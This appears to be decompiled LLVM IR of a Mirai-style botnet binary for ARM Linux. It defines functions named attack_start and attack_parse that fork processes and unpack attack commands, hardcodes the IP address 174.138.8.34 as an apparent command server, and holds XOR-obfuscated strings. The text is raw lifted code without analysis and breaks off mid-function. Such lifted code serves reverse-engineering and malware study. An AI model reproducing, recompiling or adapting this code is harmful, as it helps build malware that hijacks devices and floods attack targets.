source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_214b4.21 = global i32 0
@global_var_d5f4.25 = constant i32 -382906384
@global_var_216d4.30 = global i32 0
@global_var_831c.31 = constant i32 -352321547
@global_var_ff00.32 = constant i32 102076
@global_var_12874.33 = constant i32 -382909968
@global_var_a088.39 = constant i32 -382906384
@global_var_a4c0.41 = constant i32 -382906384
@global_var_89ac.43 = constant i32 -382906384
@global_var_c1dc.45 = constant i32 -382906384
@global_var_bae4.47 = constant i32 -382906384
@global_var_b330.49 = constant i32 -382906384
@global_var_9a6c.52 = constant i32 -382906384
@global_var_93d8.54 = constant i32 -382906384
@global_var_241f0.57 = global i32 0
@global_var_18d68.69 = constant i32 47
@global_var_241f8.71 = global i32 0
@global_var_216d8.73 = global i32 0
@global_var_241f4.75 = global i32 0
@global_var_c700.76 = constant i32 -352321440
@global_var_10844.78 = constant i32 -382910336
@global_var_d314.79 = constant i32 -509607932
@global_var_d4bc.81 = constant i32 -382910448
@global_var_21568.83 = global i32 66044
@global_var_18d6c.85 = constant [13 x i8] c"174.138.8.34\00"
@global_var_24200.88 = local_unnamed_addr global i32 0
@global_var_241fe.89 = local_unnamed_addr global i32 0
@global_var_216dc.91 = global i32 0
@global_var_18d7c.99 = constant i32 10
@global_var_21564.101 = global i32 -1
@global_var_21560.105 = global i32 -1
@global_var_13d50.107 = constant i32 -450904024
@global_var_101fc.108 = constant i32 -382910352
@global_var_18d80.111 = constant i32 16777216
@global_var_216e4.113 = global i32 0
@global_var_216f0.115 = global i32 0
@global_var_216e8.117 = global i32 0
@global_var_216ec.119 = global i32 0
@global_var_21728.133 = global i32 0
@global_var_216f4.135 = global i32 0
@global_var_21720.137 = global i32 0
@global_var_24214.141 = global i32 0
@global_var_2420c.145 = global i32 0
@global_var_24210.147 = global i32 0
@global_var_216fa.150 = local_unnamed_addr global i32 0
@global_var_216fc.154 = local_unnamed_addr global i32 0
@global_var_21700.155 = local_unnamed_addr global i32 0
@global_var_21701.156 = local_unnamed_addr global i32 0
@global_var_2171a.159 = local_unnamed_addr global i32 0
@global_var_18d8c.161 = constant i32 0
@global_var_18d88.163 = constant [5 x i8] c"&;; \00"
@global_var_18d90.165 = constant [5 x i8] c"5:?;\00"
@global_var_18d98.167 = constant [9 x i8] c"<!: acam\00"
@global_var_18da4.169 = constant [7 x i8] c" 18:1 \00"
@global_var_18dac.171 = constant [8 x i8] c"0125!8 \00"
@global_var_18db4.173 = constant [9 x i8] c"$5''#;&0\00"
@global_var_18dc0.175 = constant [6 x i8] c"509=:\00"
@global_var_18dc8.177 = constant [6 x i8] c"\22=.,\22\00"
@global_var_18dd0.179 = constant [8 x i8] c"'!$$;& \00"
@global_var_18dd8.181 = constant i32 423502179
@global_var_18de8.183 = constant [6 x i8] c"efg`a\00"
@global_var_18df0.185 = constant [5 x i8] c"!'1&\00"
@global_var_18df8.187 = constant i32 943467547
@global_var_18e04.189 = constant i32 322070023
@global_var_21704.190 = local_unnamed_addr global i32 0
@global_var_21702.191 = local_unnamed_addr global i32 0
@global_var_21708.192 = local_unnamed_addr global i32 0
@global_var_21710.194 = local_unnamed_addr global i32 0
@global_var_2171c.195 = local_unnamed_addr global i32 0
@global_var_dfc4.197 = constant i32 -382910352
@global_var_18e10.199 = constant [3 x i8] c"\0D\0A\00"
@global_var_18e1c.201 = constant i32 2096127
@global_var_18e13.203 = constant i32 2095871
@global_var_f220.206 = constant i32 136992
@global_var_2421c.209 = global i32 0
@global_var_2156c.212 = global i32 -555811921
@global_var_18e20.217 = constant i32 61015
@global_var_24224.218 = local_unnamed_addr global i32 0
@global_var_24228.219 = local_unnamed_addr global i32 0
@global_var_18e24.221 = constant i32 59987
@global_var_2422c.222 = local_unnamed_addr global i32 0
@global_var_24230.223 = local_unnamed_addr global i32 0
@global_var_18f8c.225 = constant i32 808465680
@global_var_24238.226 = local_unnamed_addr global i32 0
@global_var_24234.227 = local_unnamed_addr global i32 0
@global_var_18e28.229 = constant [7 x i8] c"'<188T\00"
@global_var_2423c.230 = local_unnamed_addr global i32 0
@global_var_24240.231 = local_unnamed_addr global i32 0
@global_var_18e30.233 = constant [8 x i8] c"1:5681T\00"
@global_var_24244.234 = local_unnamed_addr global i32 0
@global_var_24248.235 = local_unnamed_addr global i32 0
@global_var_18e38.237 = constant [8 x i8] c"'-' 19T\00"
@global_var_2424c.238 = local_unnamed_addr global i32 0
@global_var_24250.239 = local_unnamed_addr global i32 0
@global_var_18e40.241 = constant [4 x i8] c"'<T\00"
@global_var_24258.242 = local_unnamed_addr global i32 0
@global_var_24254.243 = local_unnamed_addr global i32 0
@global_var_18e44.245 = constant i32 977090171
@global_var_24260.246 = local_unnamed_addr global i32 0
@global_var_2425c.247 = local_unnamed_addr global i32 0
@global_var_18e58.249 = constant i32 470227742
@global_var_24268.250 = local_unnamed_addr global i32 0
@global_var_24264.251 = local_unnamed_addr global i32 0
@global_var_18e74.253 = constant [10 x i8] c":7;&&17 T\00"
@global_var_24270.254 = local_unnamed_addr global i32 0
@global_var_2426c.255 = local_unnamed_addr global i32 0
@global_var_18e80.257 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_24274.258 = local_unnamed_addr global i32 0
@global_var_24278.259 = local_unnamed_addr global i32 0
@global_var_18e94.261 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_24280.262 = local_unnamed_addr global i32 0
@global_var_2427c.263 = local_unnamed_addr global i32 0
@global_var_18eac.265 = constant [8 x i8] c"{$&;7{T\00"
@global_var_24284.266 = local_unnamed_addr global i32 0
@global_var_24288.267 = local_unnamed_addr global i32 0
@global_var_18eb4.269 = constant [6 x i8] c"{1,1T\00"
@global_var_2428c.270 = local_unnamed_addr global i32 0
@global_var_24290.271 = local_unnamed_addr global i32 0
@global_var_18ebc.272 = constant [5 x i8] c"{20T\00"
@global_var_24298.273 = local_unnamed_addr global i32 0
@global_var_24294.274 = local_unnamed_addr global i32 0
@global_var_18ec4.276 = constant [7 x i8] c"{95$'T\00"
@global_var_2429c.277 = local_unnamed_addr global i32 0
@global_var_242a0.278 = local_unnamed_addr global i32 0
@global_var_18ecc.280 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_242a4.281 = local_unnamed_addr global i32 0
@global_var_242a8.282 = local_unnamed_addr global i32 0
@global_var_18edc.284 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_24304.285 = local_unnamed_addr global i32 0
@global_var_24308.286 = local_unnamed_addr global i32 0
@global_var_18ee8.288 = constant [8 x i8] c"z5:=91T\00"
@global_var_2430c.289 = local_unnamed_addr global i32 0
@global_var_24310.290 = local_unnamed_addr global i32 0
@global_var_18ef0.292 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_242ac.293 = local_unnamed_addr global i32 0
@global_var_242b0.294 = local_unnamed_addr global i32 0
@global_var_18f04.296 = constant [9 x i8] c"5''#;&0T\00"
@global_var_242b4.297 = local_unnamed_addr global i32 0
@global_var_242b8.298 = local_unnamed_addr global i32 0
@global_var_ff1c.299 = constant i32 102316
@global_var_18fac.300 = constant i32 557516544
@global_var_242c0.301 = local_unnamed_addr global i32 0
@global_var_242bc.302 = local_unnamed_addr global i32 0
@global_var_18f10.304 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_242c8.305 = local_unnamed_addr global i32 0
@global_var_242c4.306 = local_unnamed_addr global i32 0
@global_var_18f24.308 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_242d0.309 = local_unnamed_addr global i32 0
@global_var_242cc.310 = local_unnamed_addr global i32 0
@global_var_18f34.312 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_242d4.313 = local_unnamed_addr global i32 0
@global_var_242d8.314 = local_unnamed_addr global i32 0
@global_var_18f44.316 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_242e0.317 = local_unnamed_addr global i32 0
@global_var_242dc.318 = local_unnamed_addr global i32 0
@global_var_18f58.320 = constant [9 x i8] c"$662*7!E\00"
@global_var_242e4.321 = local_unnamed_addr global i32 0
@global_var_242e8.322 = local_unnamed_addr global i32 0
@global_var_18f64.324 = constant [6 x i8] c";3=:T\00"
@global_var_242ec.325 = local_unnamed_addr global i32 0
@global_var_242f0.326 = local_unnamed_addr global i32 0
@global_var_18f6c.328 = constant [7 x i8] c"1: 1&T\00"
@global_var_242f4.329 = local_unnamed_addr global i32 0
@global_var_242f8.330 = local_unnamed_addr global i32 0
@global_var_18f74.332 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_242fc.333 = local_unnamed_addr global i32 0
@global_var_24300.334 = local_unnamed_addr global i32 0
@global_var_214b8.340 = global i32 0
@global_var_10be0.351 = constant i32 -509607928
@global_var_10b9c.364 = constant i32 -443088884
@global_var_1103c.381 = constant i32 -456978431
@global_var_1012c.401 = constant i32 436207625
@global_var_11834.421 = constant i32 -478871519
@global_var_f45c.425 = constant i32 -481165275
@global_var_122d8.440 = constant i32 -478805983
@global_var_126c0.450 = constant i32 -382906384
@global_var_147d0.459 = constant i32 -442544040
@global_var_13058.482 = constant i32 -369098502
@global_var_13a2c.496 = constant i32 -382910288
@global_var_13bdc.508 = constant i32 -2020859901
@global_var_13cc8.511 = constant i32 -494075872
@global_var_10a08.512 = constant i32 -382910336
@global_var_2469c.515 = local_unnamed_addr global i32 0
@global_var_12af0.529 = constant i32 -442543860
@global_var_10fa0.538 = constant i32 -369093206
@global_var_cce4.565 = constant i32 -509607926
@global_var_14cc8.567 = constant i32 -382910352
@global_var_160d8.588 = constant i32 -382906384
@global_var_15b98.617 = constant i32 -382910448
@global_var_17588.618 = constant i32 -382909968
@global_var_17cc4.680 = constant i32 -481296376
@global_var_17dbc.681 = constant i32 -481296376
@global_var_17e40.682 = constant i32 -369098732
@global_var_216b4.11 = external global i8*
@global_var_216d0.28 = external global i8*
@global_var_216d1.37 = global i8 0
@global_var_241fc.87 = global i16* null
@global_var_216e0.103 = external global i8*
@global_var_21724.139 = global i16* null
@global_var_216f8.149 = external global i8*
@global_var_2170c.152 = global i16 0
@global_var_21718.153 = local_unnamed_addr global i8 0
@global_var_2170e.157 = local_unnamed_addr global i16 0
@global_var_21719.158 = local_unnamed_addr global i8 0
@global_var_21510.336 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_216b4.11 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_216b4.11 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_216b4.11, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_214b4.21, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_214b4.21 to i32)

; uselistorder directives
  uselistorder i32* @global_var_214b4.21, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  store i32 0, i32* @fp, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d5f4.25 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 101720, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_216d0.28 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_216d0.28 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_216d4.30 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_216d4.30, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  store i32 %v2_82c4, i32* @ip, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  store i32 %v7_82dc, i32* @ip, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  store i32 %v2_8310, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v4_8368 = mul i32 %v2_834c, 16777216
  %v5_8368 = or i32 %v5_8360, %v4_8368
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
